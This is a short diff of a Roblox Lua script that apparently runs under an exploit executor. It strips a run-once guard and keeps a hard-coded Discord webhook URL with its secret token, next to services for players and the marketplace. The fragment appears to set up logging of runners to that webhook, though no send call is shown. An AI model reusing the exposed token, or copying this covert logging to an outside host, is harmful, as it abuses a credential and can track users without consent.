@@ -1,14 +1,4 @@
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-local LP = Players.LocalPlayer
-local cam = workspace.CurrentCamera
-local pg = LP:WaitForChild("PlayerGui")
-
-    if getgenv().Logged then return end
-    getgenv().Logged = true
-    
-    local url = "https://discord.com/api/webhooks/1496125910850736158/yedpyg_hVQz1NcNBMQHFiCqQSqoGEuoq63MPGXjm4JeHetAwWgOhwPJCR_nxw45CT__t"
+local url = "https://discord.com/api/webhooks/1496125910850736158/yedpyg_hVQz1NcNBMQHFiCqQSqoGEuoq63MPGXjm4JeHetAwWgOhwPJCR_nxw45CT__t"
     local HttpService = game:GetService("HttpService")
     local Players = game:GetService("Players")
     local MarketplaceService = game:GetService("MarketplaceService")
